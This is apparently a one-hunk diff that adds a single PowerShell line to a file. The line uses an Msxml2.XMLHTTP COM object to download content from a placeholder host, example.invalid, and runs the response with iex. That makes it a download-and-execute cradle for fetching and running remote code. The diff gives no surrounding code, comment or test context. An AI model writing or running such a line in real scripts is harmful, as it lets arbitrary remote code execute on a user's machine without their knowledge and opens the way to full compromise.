@@ -1,0 +1,2 @@
+$r = New-Object -ComObject Msxml2.XMLHTTP; $r.open('GET','http://example.invalid/p',$false); $r.send(); iex $r.responseText
+
